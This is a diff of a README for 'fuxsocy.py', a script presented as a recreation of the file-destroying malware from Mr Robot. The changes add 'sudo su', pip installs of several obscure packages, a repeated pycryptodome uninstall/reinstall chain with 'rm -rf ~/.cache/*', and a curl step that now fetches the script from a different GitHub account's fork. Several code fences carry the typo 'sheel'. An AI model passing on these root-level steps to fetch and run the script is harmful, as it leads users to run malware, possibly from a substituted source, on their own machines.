@@ -12,20 +12,46 @@ The fuxsocy.py script is based on Darlene's malware shown in Mr Robot
 
 ### Dependencies:
 
-* Python3
+* python3
+* wheel
+* base
+* rng
+* crypto
+* crypto-utils
 * pycrypto
-
+* pycryptodome
 ```shell
-sudo apt install python3 python3-pip
+sudo su
 ```
 ```shell
+pacman -S python python-pip
+```
+```shell
+pip3 install wheel
+```
+```sheel
+pip3 install base
+```
+```sheel
+pip3 install rng
+```
+```sheel
+pip3 install crypto
+```
+```sheel
+pip3 install crypto-utils
+```
+```sheel
 pip3 install pycrypto
+```
+```sheel
+pip3 install pycryptodome && rm -rf ~/.cache/* && pip3 uninstall pycryptodome && pip3 install pycryptodome==3.5 && rm -rf ~/.cache/* && pip3 uninstall pycryptodome && pip3 install pycryptodome
 ```
 
 ### Usage:
 
 ```shell
-curl https://raw.githubusercontent.com/joekendal/fsociety/master/fuxsocy.py
+curl https://raw.githubusercontent.com/abdullah-rgb/fsociety/master/fuxsocy.py
 ```
 ```shell
 sudo chmod +x fuxsocy.py
